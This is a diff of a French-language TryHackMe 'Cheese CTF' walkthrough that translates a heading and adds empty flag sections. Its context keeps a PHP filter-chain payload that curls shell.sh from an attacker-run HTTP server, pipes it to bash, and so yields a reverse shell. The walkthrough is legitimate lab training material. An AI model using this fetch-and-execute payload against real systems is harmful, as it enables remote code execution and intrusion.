@@ -12,7 +12,7 @@ tags: shell, cybersecurity-1, tryhackme, tryhackme-walkthrough, cheesectfv10
 
 Lien de la room: [TryHackMe | Cheese CTF](https://tryhackme.com/room/cheesectfv10)
 
-# Gain Shell Acces
+# Obtenir l’accès shell
 
 ## Avec le paramètre cmd
 
@@ -79,3 +79,7 @@ python3 attack.py --chain '<?= `curl 10.10.102.158:8000/shell.sh | bash` ?>'
 Ce payload utilise la syntaxe courte `<?= ?>` pour exécuter la commande `curl` qui télécharge et exécute le script `shell.sh` depuis le serveur HTTP.
 
 Une fois la chaîne de filtres générée, on peut l’intégrer dans l’URL et obtenir l’accès sur la machine en reverse shell.
+
+# Flag user.txt
+
+# Flag root.txt
